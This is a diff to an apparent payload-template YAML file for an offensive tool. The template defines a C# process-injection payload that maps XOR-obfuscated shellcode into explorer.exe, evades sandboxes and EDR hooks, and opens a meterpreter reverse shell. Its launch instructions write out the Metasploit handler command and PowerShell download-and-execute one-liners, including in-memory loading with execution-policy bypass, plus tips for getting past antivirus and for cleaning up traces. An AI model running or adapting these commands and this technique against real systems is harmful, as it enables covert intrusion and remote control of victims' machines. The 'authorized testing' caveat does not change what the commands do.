@@ -1,20 +1,20 @@
 meta:
-  name: "Sections Process Injection, XOR (C#)"
+  name: "Sections Process Injection, XOR (C#)*"
   category: "Process Injection"
   description: |
     Advanced process injection using low-level ntdll APIs for memory-mapped shellcode execution.
-    
+
     Features:
     - NtCreateSection/NtMapViewOfSection for stealthy memory sharing
     - XOR encryption for basic obfuscation (key: 0xfa)
     - VirtualAllocExNuma sandbox evasion
     - Targets explorer.exe process
     - Avoids common EDR hooks on kernel32 APIs
-    
+
     This technique creates a memory section object that is mapped into both
     the current and target processes, allowing shellcode to be written locally
     and executed remotely without using VirtualAllocEx/WriteProcessMemory.
-    
+
     WARNING: For authorized security testing only!
 
   effectiveness: "high"
@@ -93,21 +93,39 @@ output:
     enabled: true
     command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
   launch_instructions: |
-    C# XOR Sections Process Injection - Launch Instructions
+    # Start Listener
 
-    Start Listener:
-    $ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```bash
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```
 
-    Transfer and Execute (Requires Admin):
-    $ python3 -m http.server 80
-    $ powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; Start-Process {{ output_file }}"
+    # Transfer and Execute (Requires Admin)
 
-    In-Memory Execution:
-    $ python3 -m http.server 80
-    $ powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [SectionsInjection.Program]::Main(@())"
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
 
-    Notes:
-    - XOR encrypted with key: 0x{{ xor_key }}
+    **Target:**
+    ```powershell
+    powershell -c "IWR -Uri http://{{ lhost }}:/{{ output_file }} -OutFile {{ output_file }}; Start-Process {{ output_file }}"
+    ```
+
+    # In-Memory Execution
+
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
+
+    **Target:**
+    ```powershell
+    powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}:/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [SectionsInjection.Program]::Main(@())"
+    ```
+
+    # Notes
+
+    - XOR encrypted with key: `0x{{ xor_key }}`
     - Uses NtCreateSection/NtMapViewOfSection (avoids kernel32 hooks like VirtualAllocEx/WriteProcessMemory)
     - VirtualAllocExNuma sandbox evasion (fails on sandboxes without NUMA support)
     - Injects into explorer.exe (requires elevated privileges or SeDebugPrivilege)
@@ -116,14 +134,18 @@ output:
     - More stealthy than standard remote process injection
     - Technique: Create section → Map to local process → Write shellcode → Map to remote process → Create thread
 
-    Troubleshooting:
-    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
-    - Access Denied: Requires SeDebugPrivilege or admin rights to inject into explorer.exe
-    - Explorer.exe not running: Unlikely but check with `tasklist | findstr explorer.exe`
-    - AV blocks: NtCreateSection may be monitored; consider additional obfuscation
-    - Sysmon Event ID 8 (CreateRemoteThread) will fire
-    - NUMA check fails: Some VMs/sandboxes don't support NUMA; tool will exit
+    # Troubleshooting
 
-    Cleanup:
-    On target:
-    $ Remove-Item {{ output_file }} -Force
+    - **No connection:** Check firewall rules on attacker (allow `{{ lport }}/tcp`)
+    - **Access Denied:** Requires SeDebugPrivilege or admin rights to inject into explorer.exe
+    - **Explorer.exe not running:** Unlikely but check with `tasklist | findstr explorer.exe`
+    - **AV blocks:** NtCreateSection may be monitored; consider additional obfuscation
+    - **Sysmon Event ID 8** (CreateRemoteThread) will fire
+    - **NUMA check fails:** Some VMs/sandboxes don't support NUMA; tool will exit
+
+    # Cleanup
+
+    **Target:**
+    ```powershell
+    Remove-Item {{ output_file }} -Force
+    ```
